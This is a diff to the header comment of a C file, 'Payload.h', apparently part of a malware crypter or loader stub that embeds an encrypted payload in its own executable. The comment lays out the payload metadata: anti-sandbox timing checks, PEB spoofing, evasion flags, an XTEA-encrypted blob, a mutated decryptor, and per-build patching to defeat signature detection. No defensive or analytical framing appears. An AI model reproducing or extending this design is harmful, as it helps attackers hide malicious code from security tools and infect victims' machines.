@@ -9,18 +9,21 @@ extern "C" {
 /* =========================================================================
  *  Payload.h - Module isolating payload reading from its own .exe file
  *
+ *  RT_RCDATA resource ID is per-build (default 101 in unpatched stub.bin).
+ *  Builder patches g_PayloadResIdMarker[4..5] in stub.bin before embedding.
+ *
  *  .rsrc metadata block layout (last 280 bytes of the resource):
  *
  *  Offsets from magic position p (p points at first byte of magic DWORD):
  *    p[  0..  3]  magic          — key_salt[0]^key_salt[1]^key_salt[2]^key_salt[3]
- *    p[  -4.. -1] flags          — OPSEC_FLAG_* bitmask (DWORD)
+ *    p[  -4.. -1] flags          — OPSEC_FLAG_* + EVASION_FLAG_* bitmask (DWORD)
  *    p[  -8.. -5] hammer_ms      — API-hammer duration in ms; 0 = default 3000 (DWORD)
  *    p[ -12.. -9] uptime_min     — uptime threshold in minutes; 0 = default 2 (DWORD)
  *    p[ -16..-13] sleep_fwd_ms   — sleep-fwd sleep duration in ms; 0 = default 500 (DWORD)
  *    p[ -48..-17] semaphore_name — exec-ctrl semaphore name (32 bytes, zero-padded)
  *    p[-112..-49] spoof_exe      — ASCII filename for PEB spoof (64 bytes, zero-padded)
  *    p[-240..-113] exportArg     — null-terminated export argument string (128 bytes, zero-padded)
- *    p[-244..-241] exportHash    — fixed-seed Djb2 hash of DLL export to invoke (DWORD; 0 = none)
+ *    p[-244..-241] exportHash    — Djb2(export, key_salt[0]); 0 = none (DWORD)
  *    p[-248..-245] blobSize      — XTEA blob size (DWORD)
  *    p[-252..-249] stubSize      — mutated ASM decryptor size (DWORD)
  *    p[-256..-253] origSize      — original decompressed PE size (ULONG)
